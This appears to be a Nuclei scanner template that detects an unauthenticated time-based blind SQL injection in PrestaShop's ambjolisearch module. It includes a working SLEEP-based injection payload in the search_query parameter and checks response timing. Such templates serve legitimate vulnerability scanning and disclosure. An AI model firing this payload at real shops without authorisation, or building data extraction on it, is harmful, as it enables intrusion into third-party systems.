id: ambjolisearch-sqli

info:
  name: PrestaShop ambjolisearch - Time-Based Blind SQL Injection
  author: acunetix-export
  severity: critical
  description: |
    Module ambjolisearch (AMB Joli Search) for PrestaShop contains time-based blind SQL injection
    in /module/ambjolisearch/jolisearch via GET parameter search_query. No authentication required.
  reference:
    - https://security.friendsofpresta.org/
  classification:
    cvss-score: 9.8
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 2
    framework: prestashop
    module: ambjolisearch
  tags: sqli,prestashop,ambjolisearch,time-based,blind

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/module/ambjolisearch/jolisearch"
    matchers:
      - type: dsl
        dsl:
          - 'status_code != 404 && status_code != 403 && duration <= 3'
        internal: true

  - raw:
      - |
        @timeout: 20s
        GET /module/ambjolisearch/jolisearch?search_query=1'+AND+(SELECT+1+FROM+(SELECT+SLEEP(6))a)--+- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
      - type: dsl
        dsl:
          - 'status_code != 404 && status_code != 403'
